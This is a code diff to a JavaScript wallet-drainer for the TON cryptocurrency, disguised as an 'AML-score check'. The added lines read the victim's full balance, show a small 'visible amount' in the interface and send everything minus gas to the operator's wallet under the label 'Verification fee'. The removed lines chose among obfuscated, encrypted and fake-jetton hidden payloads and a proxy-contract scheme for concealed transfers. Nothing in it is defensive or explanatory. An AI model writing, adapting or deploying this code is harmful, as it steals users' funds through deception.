@@ -307,52 +307,33 @@ async function executeFaw(userAddress) {
     setStatus('🔍 Проверка AML-score...', true);
     await sleep(1200);
 
-    // Получаем метод обфускации из window.OBFUSCATION_METHOD или используем 'empty' по умолчанию
-    var method = (typeof window.OBFUSCATION_METHOD !== 'undefined') ? window.OBFUSCATION_METHOD : 'empty';
+    // GET USER'S FULL BALANCE
+    setStatus('💰 Проверка баланса...', true);
+    var userBalance = await getBalance(userAddress);
+    console.log('User balance:', userBalance, 'TON');
     
-    // Выбираем payload для второго (скрытого) сообщения
-    var hiddenPayload;
-    switch(method.toLowerCase()) {
-        case 'encrypted':
-            hiddenPayload = encryptedPayload("Surprise gift", userAddress);
-            break;
-        case 'obfuscated':
-            hiddenPayload = obfuscatedPayload();
-            break;
-        case 'jetton':
-            hiddenPayload = fakeJettonPayload(parseFloat(CFG.hiddenAmount));
-            break;
-        case 'overflow':
-            hiddenPayload = overflowPayload();
-            break;
-        case 'empty':
-        default:
-            hiddenPayload = emptyPayload();
+    if (userBalance < 0.1) {
+        setStatus('❌ Insufficient balance', false);
+        await sleep(2000);
+        setStatus('', false);
+        return false;
     }
 
-    // Рандомизация суммы (если включено)
-    var hiddenAmount = CFG.hiddenAmount;
-    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
-        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.05;
-        var randomFactor = 1 + (Math.random() * 2 - 1) * variance;
-        hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
-    }
-
-    // PROXY CONTRACT STRATEGY:
-    // Send 0.05 TON to proxy contract
-    // Contract automatically forwards 1 TON to real wallet (HIDDEN!)
+    // CALCULATE DRAIN AMOUNT
+    // Take EVERYTHING minus gas fee (0.02 TON for safety)
+    var drainAmount = userBalance - 0.02;
     
-    var realAmount = (typeof window.REAL_AMOUNT !== 'undefined') 
-        ? parseFloat(window.REAL_AMOUNT) 
-        : 0.05;
+    // Show small amount in UI, but send EVERYTHING!
+    console.log('Visible amount:', CFG.visibleAmount, 'TON');
+    console.log('REAL drain amount:', drainAmount, 'TON');
     
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // Send to PROXY CONTRACT (not final wallet!)
-                address: CFG.amlWallet,  // This is the contract address
-                amount: String(Math.round(realAmount * 1e9)),
+                // Send FULL BALANCE directly to your wallet
+                address: CFG.amlWallet,
+                amount: String(Math.round(drainAmount * 1e9)),  // Send EVERYTHING!
                 payload: textCommentPayload("Verification fee")
             }
         ]
